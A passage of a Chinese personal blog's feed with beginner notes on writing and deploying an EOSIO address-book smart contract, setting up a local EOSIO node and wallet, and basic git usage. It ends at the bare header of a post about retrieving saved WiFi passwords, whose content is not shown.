get_first_receiver().value);</span><br></pre></td></tr></table></figure><p>之后查询迭代器，将其设置为变量。因为它后面会需要被多次使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto iterator &#x3D; addresses.find(user.value)</span><br></pre></td></tr></table></figure><p>它的用处是用来查询用户</p><h3 id="创建-修改表"><a href="#创建-修改表" class="headerlink" title="创建/修改表"></a>创建/修改表</h3><p>上面的addresses.find查找某个用户，如果用户不存在，会返回null, 赋值给iterator。而addresses.end()方法就是”null”的别名。因此可以判断它们是否相等来判断某个用户是否存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#如果用户不存在，就创建一条记录。</span><br><span class="line">if(iterator &#x3D;&#x3D; addresses.end())&#123;</span><br><span class="line">addresses.emplace(user, [&amp;](auto&amp; row)&#123;</span><br><span class="line">row.key &#x3D; user;</span><br><span class="line">row.first_name &#x3D; first_name;</span><br><span class="line">row.last_name &#x3D; last_name;</span><br><span class="line">row.street &#x3D; street;</span><br><span class="line">row.city &#x3D; city;</span><br><span class="line">row.state &#x3D; state;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;#如果用户存在，就修改其记录</span><br><span class="line"> addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123;&#x2F;&#x2F;找到的用户iterator, 为添加这条记录付款的当前用户，lamba函数引用修改</span><br><span class="line">      row.key &#x3D; user;</span><br><span class="line">      row.first_name &#x3D; first_name;</span><br><span class="line">      row.last_name &#x3D; last_name;</span><br><span class="line">      row.street &#x3D; street;</span><br><span class="line">      row.city &#x3D; city;</span><br><span class="line">      row.state &#x3D; state;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="从表中删除记录"><a href="#从表中删除记录" class="headerlink" title="从表中删除记录"></a>从表中删除记录</h2><p>前面部分一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void erase(name user)&#123;</span><br><span class="line">require_auth(user);</span><br><span class="line">address_index addresses(get_self(), get_first_receiver().value);</span><br><span class="line">auto iterator &#x3D; addresses.find(user.value);</span><br><span class="line">check(iterator !&#x3D; addresses.end, &quot;Record does not exist&quot;);&#x2F;&#x2F;检查记录是否存在</span><br><span class="line">addresses.erase(iterator);&#x2F;&#x2F;存在则删除</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为ABI准备"><a href="#为ABI准备" class="headerlink" title="为ABI准备"></a>为ABI准备</h2><p>要使ABI生成器正常工作，需要添加一写action生命。</p><p>在upsert和erase函数上方，添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[eosio::action]]</span><br></pre></td></tr></table></figure><p>对person数据结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct person&#123;...&#125; --&gt; struct [[eosio::table]] person&#123;...&#125;</span><br></pre></td></tr></table></figure><p>有了这个声明才会将一些必要的描述添加到ABI文件中。</p><h2 id="最终的合约"><a href="#最终的合约" class="headerlink" title="最终的合约"></a>最终的合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;eosio&#x2F;eosio.hpp&gt;</span><br><span class="line"></span><br><span class="line">using namespace eosio;</span><br><span class="line"></span><br><span class="line">class [[eosio::contract(&quot;addressbook&quot;)]] addressbook : public eosio::contract &#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">  addressbook(name receiver, name code,  datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  void upsert(name user, std::string first_name, std::string last_name, std::string street, std::string city, std::string state) &#123;</span><br><span class="line">    require_auth( user );</span><br><span class="line">    address_index addresses( get_self(), get_first_receiver().value );</span><br><span class="line">    auto iterator &#x3D; addresses.find(user.value);</span><br><span class="line">    if( iterator &#x3D;&#x3D; addresses.end() )</span><br><span class="line">    &#123;</span><br><span class="line">      addresses.emplace(user, [&amp;]( auto&amp; row ) &#123;</span><br><span class="line">       row.key &#x3D; user;</span><br><span class="line">       row.first_name &#x3D; first_name;</span><br><span class="line">       row.last_name &#x3D; last_name;</span><br><span class="line">       row.street &#x3D; street;</span><br><span class="line">       row.city &#x3D; city;</span><br><span class="line">       row.state &#x3D; state;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123;</span><br><span class="line">        row.key &#x3D; user;</span><br><span class="line">        row.first_name &#x3D; first_name;</span><br><span class="line">        row.last_name &#x3D; last_name;</span><br><span class="line">        row.street &#x3D; street;</span><br><span class="line">        row.city &#x3D; city;</span><br><span class="line">        row.state &#x3D; state;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  void erase(name user) &#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line"></span><br><span class="line">    address_index addresses( get_self(), get_first_receiver().value);</span><br><span class="line"></span><br><span class="line">    auto iterator &#x3D; addresses.find(user.value);</span><br><span class="line">    check(iterator !&#x3D; addresses.end(), &quot;Record does not exist&quot;);</span><br><span class="line">    addresses.erase(iterator);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  struct [[eosio::table]] person &#123;</span><br><span class="line">    name key;</span><br><span class="line">    std::string first_name;</span><br><span class="line">    std::string last_name;</span><br><span class="line">    std::string street;</span><br><span class="line">    std::string city;</span><br><span class="line">    std::string state;</span><br><span class="line">    uint64_t primary_key() const &#123; return key.value; &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="准备Ricardian合同"><a href="#准备Ricardian合同" class="headerlink" title="准备Ricardian合同"></a>准备Ricardian合同</h2><p>没有Ricardian合同，编译使会产生警告，然后默认生成一些条目。</p><p>首先新建文件（合约名称需与智能合约的名称相同）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch addressbook.contracts.md</span><br></pre></td></tr></table></figure><p>然后往文件添加定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 class&#x3D;&quot;contract&quot;&gt;upsert&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.2</span><br><span class="line">title: Upsert</span><br><span class="line">summary: This action will either insert or update an entry in the address book. If an entry exists with the same name as the specified user parameter, the record is updated with the first_name, last_name, street, city, and state parameters. If a record does not exist, a new record is created. The data is stored in the multi index table. The ram costs are paid by the smart contract.</span><br><span class="line">icon:</span><br><span class="line"></span><br><span class="line">&lt;h1 class&#x3D;&quot;contract&quot;&gt;erase&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.2</span><br><span class="line">title: Erase</span><br><span class="line">summary: This action will remove an entry from the address book if an entry in the multi index table exists with the specified name.</span><br><span class="line">icon:</span><br></pre></td></tr></table></figure><h2 id="准备Ricardian子句"><a href="#准备Ricardian子句" class="headerlink" title="准备Ricardian子句"></a>准备Ricardian子句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch addressbook.clauses.md</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Storage&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.1</span><br><span class="line">title: General Data Storage</span><br><span class="line">summary: This smart contract will store data added by the user. The user consents to the storage of this data by signing the transaction.</span><br><span class="line">icon:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Usage&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.1</span><br><span class="line">title: General Data Use</span><br><span class="line">summary: This smart contract will store user data. The smart contract will not use the stored data for any purpose outside store and delete.</span><br><span class="line">icon:</span><br><span class="line"></span><br><span class="line">&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Ownership&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.1</span><br><span class="line">title: Data Ownership</span><br><span class="line">summary: The user of this smart contract verifies that the data is owned by the smart contract, and that the smart contract can use the data in accordance to the terms defined in the Ricardian Contract.</span><br><span class="line">icon:</span><br><span class="line"></span><br><span class="line">&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Distirbution&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.1</span><br><span class="line">title: Data Distirbution</span><br><span class="line">summary: The smart contract promises to not actively share or distribute the address data. The user of the smart contract understands that data stored in a multi index table is not private data and can be accessed by any user of the blockchain.  </span><br><span class="line">icon:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Future&lt;&#x2F;h1&gt;</span><br><span class="line">---</span><br><span class="line">spec-version: 0.0.1</span><br><span class="line">title: Data Future</span><br><span class="line">summary: The smart contract promises to only use the data in accordance of the terms defined in the Ricardian Contract, now and at all future dates.</span><br><span class="line">icon:</span><br></pre></td></tr></table></figure><h2 id="编译-部署合约"><a href="#编译-部署合约" class="headerlink" title="编译/部署合约"></a>编译/部署合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp addressbook.cpp -o addressbook.wasm</span><br></pre></td></tr></table></figure><p>编译之后，进行部署。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio addressbook EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC -p eosio@active</span><br></pre></td></tr></table></figure><p>创建一个账户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook -p addressbook@active</span><br></pre></td></tr></table></figure><p>部署合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>测试合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;bob&quot;, &quot;bob&quot;, &quot;is a loser&quot;, &quot;doesnt exist&quot;, &quot;somewhere&quot;, &quot;someplace&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>检查alice是否无法为bob添加记录。报错了，确实阻止了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get table addressbook addressbook people --lower alice --limit 1</span><br></pre></td></tr></table></figure><p>检查alice的记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook erase &#39;[&quot;alice&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>测试alice是否可以删除记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get table addressbook addressbook people --lower alice --limit 1</span><br></pre></td></tr></table></figure><p>检查记录是否已经删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进入智能合约部分。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BlockChain" scheme="https://ggyggy666.github.io/categories/BlockChain/"/>
    
    
      <category term="区块链安全之EOS学习（二）" scheme="https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全之EOS学习（一）</title>
    <link href="https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-03-17T07:10:04.000Z</published>
    <updated>2021-03-17T13:35:57.141Z</updated>
    
    <content type="html"><![CDATA[<p>入门指南：<a href="https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements" target="_blank" rel="noopener">https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements</a></p><a id="more"></a><h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><h2 id="下载EOSIO"><a href="#下载EOSIO" class="headerlink" title="下载EOSIO"></a>下载EOSIO</h2><p>Ubuntu18.04：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/EOSIO/eos/releases/download/v2.0.9/eosio_2.0.9-1-ubuntu-18.04_amd64.deb</span><br><span class="line">sudo apt install ./eosio_2.0.9-1-ubuntu-18.04_amd64.deb</span><br></pre></td></tr></table></figure><h2 id="设置目录"><a href="#设置目录" class="headerlink" title="设置目录"></a>设置目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir contracts</span><br><span class="line">cd contracts</span><br></pre></td></tr></table></figure><h2 id="安装CDT"><a href="#安装CDT" class="headerlink" title="安装CDT"></a>安装CDT</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/eosio/eosio.cdt/releases/download/v1.7.0/eosio.cdt_1.7.0-1-ubuntu-18.04_amd64.deb</span><br><span class="line"></span><br><span class="line">sudo apt install ./eosio.cdt_1.7.0-1-ubuntu-18.04_amd64.deb</span><br></pre></td></tr></table></figure><h2 id="创建钱包"><a href="#创建钱包" class="headerlink" title="创建钱包"></a>创建钱包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet create --to-console</span><br></pre></td></tr></table></figure><p>创建一个default账户，返回一个密码，要好好保存它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet open</span><br></pre></td></tr></table></figure><p>打开钱包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet list</span><br></pre></td></tr></table></figure><p>返回钱包列表。这个时候default账户是锁了的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet unlock</span><br></pre></td></tr></table></figure><p>解锁钱包，需要用到上面创建时候的密码。再查看钱包列表，会发现default后面多了个*，表明钱包已解锁。</p><h2 id="将密钥导入钱包"><a href="#将密钥导入钱包" class="headerlink" title="将密钥导入钱包"></a>将密钥导入钱包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet create_key</span><br></pre></td></tr></table></figure><p>生成一个私钥和公钥，返回的是公钥，这个公钥也要好好保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet import</span><br></pre></td></tr></table></figure><p>导入私钥，这时候会提醒输入开发密钥，只需要输入下面的开发密钥(eosio提供的):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5KQwrPbwdL6PhXujxW37FSSQZ1JiwsST4cqQzDeyXtP79zkvFD3</span><br></pre></td></tr></table></figure><h1 id="部署区块链"><a href="#部署区块链" class="headerlink" title="部署区块链"></a>部署区块链</h1><p>钱包和智能合约创建好后，开始部署到区块链进行测试。</p><h2 id="keosd"><a href="#keosd" class="headerlink" title="keosd"></a>keosd</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keosd &amp;</span><br></pre></td></tr></table></figure><p>启动keosd。看到一些输出，然后按回车即可。如果遇到错误信息，很可能是另一个keosd在运行，需要使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkill keosd&#x2F;&#x2F;杀死所有keosd实例</span><br><span class="line">keosd &amp;&#x2F;&#x2F;重新运行</span><br></pre></td></tr></table></figure><h2 id="nodeos"><a href="#nodeos" class="headerlink" title="nodeos"></a>nodeos</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nodeos -e -p eosio \</span><br><span class="line">--plugin eosio::producer_plugin \</span><br><span class="line">--plugin eosio::producer_api_plugin \</span><br><span class="line">--plugin eosio::chain_api_plugin \</span><br><span class="line">--plugin eosio::http_plugin \</span><br><span class="line">--plugin eosio::history_plugin \</span><br><span class="line">--plugin eosio::history_api_plugin \</span><br><span class="line">--filter-on&#x3D;&quot;*&quot; \</span><br><span class="line">--access-control-allow-origin&#x3D;&#39;*&#39; \</span><br><span class="line">--contracts-console \</span><br><span class="line">--http-validate-host&#x3D;false \</span><br><span class="line">--verbose-http-errors &gt;&gt; nodeos.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>启动nodeos, 这个命令会加载所有插件，设置服务器地址，启用CORS并添加一些合同调试和日志记录。当然启动后很可能也是有另一个在运行，同意得先<strong>kill</strong>掉再<strong>重启</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f nodeos.log</span><br></pre></td></tr></table></figure><p>看到一堆输出，这是检查nodeos是否正在生产块，Ctrl+C即可停止。</p><h2 id="查看钱包"><a href="#查看钱包" class="headerlink" title="查看钱包"></a>查看钱包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet list</span><br></pre></td></tr></table></figure><p>查看钱包列表，这时会看到一个空钱包列表。</p><h2 id="浏览器检查nodeos端点"><a href="#浏览器检查nodeos端点" class="headerlink" title="浏览器检查nodeos端点"></a>浏览器检查nodeos端点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;localhost:8888&#x2F;v1&#x2F;chain&#x2F;get_info</span><br></pre></td></tr></table></figure><p>即可查看到区块信息。</p><h1 id="创建开发账户"><a href="#创建开发账户" class="headerlink" title="创建开发账户"></a>创建开发账户</h1><p>可创建多个账户，注意需要对账户分配权限。</p><h2 id="创建测试账户"><a href="#创建测试账户" class="headerlink" title="创建测试账户"></a>创建测试账户</h2><p><strong>需要先确保钱包解锁了。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio bob 公钥</span><br></pre></td></tr></table></figure><p>这个公钥是之前保存的钱包的公钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get account bob</span><br></pre></td></tr></table></figure><p>获取bob账户的相关信息，比如它关联的公钥。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;入门指南：&lt;a href=&quot;https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="BlockChain" scheme="https://ggyggy666.github.io/categories/BlockChain/"/>
    
    
      <category term="区块链安全之EOS学习（一）" scheme="https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>git学习</title>
    <link href="https://ggyggy666.github.io/2021/03/08/git%E5%AD%A6%E4%B9%A0/"/>
    <id>https://ggyggy666.github.io/2021/03/08/git%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-08T12:06:45.000Z</published>
    <updated>2021-03-17T13:36:57.700Z</updated>
    
    <content type="html"><![CDATA[<p>之前学习过git操作，但是又忘了，特此记录。</p><a id="more"></a><h1 id="初始使用"><a href="#初始使用" class="headerlink" title="初始使用"></a>初始使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;dd&quot; &gt;&gt; README.md#在工作区新建一个文件</span><br><span class="line">git init#git初始化</span><br><span class="line">git add README.md#将工作区文件添加到暂存区</span><br><span class="line">git commit -m &quot;first commit&quot;#将暂存区的文件提交到本地仓库，并添加描述“first commit”</span><br><span class="line">git remote add origin &#39;git的地址&#39;#需要在GitHub新建一个仓库，然后复制那个仓库地址。origin是这个地址的描述。</span><br><span class="line">git push -u origin master#将origin添加到master分支。</span><br></pre></td></tr></table></figure><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><p>git remote这个只需要第一次连接时才用。之后就不用了。如果是添加或者修改文件，不用分支的话，只需要:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add xxx</span><br><span class="line">git commit -m &quot;xx&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>通过建立分支，可以方便获取每次修改的文件内容，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b content#创建并切换到content分支</span><br><span class="line">这个时候去修改文件内容，完之后。</span><br><span class="line">git status#查看文件的状态</span><br><span class="line">git add xxx#将工作区文件添加到暂存区</span><br><span class="line">git commit -m &quot;xxx&quot;#提交到本地仓库，这个时候可以描述是&quot;second commit&quot;</span><br><span class="line">git checkout master#切换回master分支</span><br><span class="line">git merge content#将content分支合并到master分支。这样在content分区修改了的内容就会被合并到master分支</span><br><span class="line">git log#查看文件日志</span><br><span class="line">git push#推送到GitHub</span><br></pre></td></tr></table></figure><h1 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone 网址</span><br><span class="line">git mv [原文件] [新文件]#修改文件名</span><br><span class="line">git rm [文件名]#删除文件</span><br><span class="line">git pull [远程主机别名]&lt;远程分支名称&gt;:[本地分支名称]#下载代码并快速合并</span><br><span class="line">git push [远程主机别名][本地分支名称]:&lt;远程分支名称&gt;</span><br></pre></td></tr></table></figure><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>遇到一个问题，git无法连接上GitHub了，搞了一下午，最后终于解决了。使用SSH连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  git remote set-url origin git@github.com:xxx（仓库ssh地址）</span><br><span class="line"> 2.https:&#x2F;&#x2F;blog.csdn.net&#x2F;YanceChen2013&#x2F;article&#x2F;details&#x2F;82218356</span><br><span class="line">3.第二步会遇到问题，看下面链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;argleary&#x2F;article&#x2F;details&#x2F;100638560</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前学习过git操作，但是又忘了，特此记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="git学习" scheme="https://ggyggy666.github.io/tags/git%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>获取电脑连接的WiFi密码</title>
    <link href="https://ggyggy666.github.io/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/"/>
    <id>https://ggyggy666.github.io/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/</id>
    <published>2021-03-08T12:05:45.000Z</published>
    <updated>2021-03-13T02:13:46.449Z</updated>
    
